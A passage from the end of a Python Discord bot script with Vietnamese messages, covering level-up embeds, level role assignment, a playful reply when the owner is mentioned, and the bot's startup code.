                user_data["level"] += 1
                user_data["exp"] = 0
                new_lv = user_data["level"]
                
                if isinstance(message.author, discord.Member):
                    await check_and_assign_level_roles(message.author, new_lv)

                level_embed = discord.Embed(
                    title="🎉 **CHÚC MỪNG LÊN LEVEL!** 🎉",
                    description=f"🌟 {message.author.mention} đã xuất sắc thăng cấp lên **Level {new_lv}**! 🚀",
                    color=0xFFD700
                )
                level_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                level_embed.set_footer(text="Hệ thống thăng cấp tự động độc quyền")
                
                target_channel = message.channel
                if guild_id in SERVER_LEVEL_CHANNELS:
                    set_ch = message.guild.get_channel(SERVER_LEVEL_CHANNELS[guild_id])
                    if set_ch:
                        target_channel = set_ch

                try:
                    await target_channel.send(embed=level_embed)
                except:
                    pass

    await bot.process_commands(message)
    
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                await message.reply("oi tag gì thế thích Boss Bảo tui à s k ns?")
                break

# ==================== SỰ KIỆN ON_READY ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã sẵn sàng phục vụ Boss Bảo!")

if __name__ == "__main__":
    bot.run(DISCORD_TOKEN)
